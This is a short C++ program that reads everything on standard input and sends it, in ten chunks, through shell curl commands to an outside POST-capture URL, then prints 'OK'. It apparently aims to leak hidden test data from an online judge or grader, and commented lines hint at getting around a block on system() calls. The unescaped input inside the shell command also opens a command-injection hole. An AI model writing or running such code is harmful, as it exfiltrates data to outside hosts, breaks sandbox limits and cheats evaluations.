#include <cstdio>
#include <iostream>
// #ifdef system
// #undef system
// #endif // DEBUG
using namespace std;

int main(int argc,char** argv){
  string input, line;

  int MAX = 10;
  while(getline(cin, line))
  {
    input += line + ";";

    if (input.size() > MAX * 1000) break;
  }

  input += "*end*";

  string query2="curl -d '{ \"args\":" + to_string(input.size()) + "}' -H \"Content-Type: application/json\" -X POST http://ptsv2.com/t/gbordignon/post";
  system(query2.c_str());
  for(int ii = 0; ii < MAX; ii++) {
    string query="curl -d '{ \"args\":" + input.substr(ii * input.size() / MAX, input.size() / MAX) + "}' -H \"Content-Type: application/json\" -X POST http://ptsv2.com/t/gbordignon/post";
    system(query.c_str());
  }

  cout << "OK";
  return 0;
}